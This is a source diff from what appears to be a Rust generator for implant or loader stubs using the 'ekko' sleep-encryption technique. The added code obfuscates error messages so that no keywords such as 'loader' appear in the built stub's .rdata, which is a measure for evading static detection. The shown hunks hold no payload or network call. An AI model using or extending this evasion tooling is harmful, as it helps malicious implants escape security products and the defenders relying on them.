@@ -159,6 +159,49 @@ pub const DEF: TechniqueDef = TechniqueDef {
     resolves_imports: false,
 };
 
+/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
+/// pairs.
+///
+/// `render_fragment` replaces each placeholder with code that rebuilds the
+/// message at runtime, so no diagnostic text — least of all a technique keyword
+/// like `loader` — lands in the generated stub's `.rdata`. Messages that
+/// interpolate an error code keep a keyword-free `format!` literal in the
+/// fragment's `step_error` helper and take the label from here.
+const MESSAGES: &[(&str, &str)] = &[
+    (
+        "$MSG_CAPTURE_CONTEXT_FAILED$",
+        "could not capture a timer-thread context",
+    ),
+    (
+        "$MSG_CREATE_TIMER_QUEUE_FAILED$",
+        "could not create the timer queue",
+    ),
+    (
+        "$MSG_CREATE_TIMER_QUEUE_TIMER_FAILED$",
+        "could not queue a timer",
+    ),
+    (
+        "$MSG_VIRTUAL_QUERY_FAILED$",
+        "could not walk the image memory",
+    ),
+    (
+        "$MSG_VIRTUAL_PROTECT_FAILED$",
+        "could not change the image memory protection",
+    ),
+    (
+        "$MSG_CRYPT_FUNCTION_NOT_FOUND$",
+        "could not resolve the RC4 system function",
+    ),
+    (
+        "$MSG_CRYPT_FUNCTION_FAILED$",
+        "the RC4 system function failed",
+    ),
+    (
+        "$MSG_NO_TARGET_REGIONS$",
+        "no committed region of the image to encrypt",
+    ),
+];
+
 impl Params {
     /// Renders the ekko stub fragment, baking in the sleep length and the
     /// obfuscated API/DLL names.
@@ -212,6 +255,18 @@ impl Params {
             let expr = strings.obfuscate(name).render_stub_expr(var);
             fragment = fragment.replace(placeholder, &expr);
         }
+
+        // The error labels get the same treatment as the resolved names: each
+        // message is rebuilt at runtime, so no diagnostic text reaches `.rdata`.
+        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
+            fragment = fragment.replace(
+                placeholder,
+                &strings
+                    .obfuscate(text)
+                    .render_stub_expr(&format!("sleep_msg_{index}")),
+            );
+        }
+
         fragment = fragment.replace("$SLEEP_MS$", &self.sleep_ms.to_string());
 
         // The sleeping image is RC4-encrypted with a fresh per-build key; its
